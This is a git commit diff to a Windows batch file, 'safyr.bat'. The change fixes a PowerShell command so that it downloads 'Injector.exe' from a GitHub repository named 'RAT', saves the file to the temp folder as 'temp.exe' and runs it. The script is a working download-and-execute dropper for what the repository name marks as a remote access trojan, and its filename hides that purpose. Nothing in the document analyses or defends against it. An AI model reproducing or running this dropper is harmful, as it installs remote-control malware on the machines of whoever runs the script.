ab7320d210b312fe3eb4af0cc224aeb679c83624
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-04 12:33:01 -0400

    Add files via upload

--- safyr.bat
+++ safyr.bat
@@ -1,5 +1,5 @@
 @echo off
 set "TEMPFILE=%TEMP%\temp.exe"
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/GLICHED-HACKER/RAT/blob/main/Injector.exe' -OutFile '%TEMPFILE%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/Injector.exe' -OutFile '%TEMPFILE%'"
 start "" "%TEMPFILE%"
 exit /b
